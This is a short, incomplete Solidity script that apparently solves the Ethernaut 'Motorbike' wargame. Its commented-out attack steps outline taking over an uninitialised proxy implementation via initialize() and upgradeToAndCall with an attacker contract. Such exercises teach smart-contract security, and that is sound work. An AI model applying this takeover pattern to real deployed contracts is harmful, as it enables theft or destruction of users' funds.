// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {CheckScript} from "./common/Check.sol";
import {SolveScript} from "./common/Solve.sol";
import {Motorbike, Engine, Address} from "~/Motorbike.sol";
import {Attacker} from "~/helpers/Motorbike.sol";

contract Check is CheckScript("MOTORBIKE") {}

contract Solve is SolveScript("MOTORBIKE") {
    Motorbike target;

    constructor() {
        target = Motorbike(instance);

        // FIXME: get engine address here
    }

    function attack() public override {
        // the engine is not actually initialized, lets do that!
        // engine.initialize();

        // // deploy new initialization i.e. our attacker
        // Attacker attacker = new Attacker();
        // engine.upgradeToAndCall(address(attacker), abi.encodePacked(Attacker.pwn.selector));
    }
}
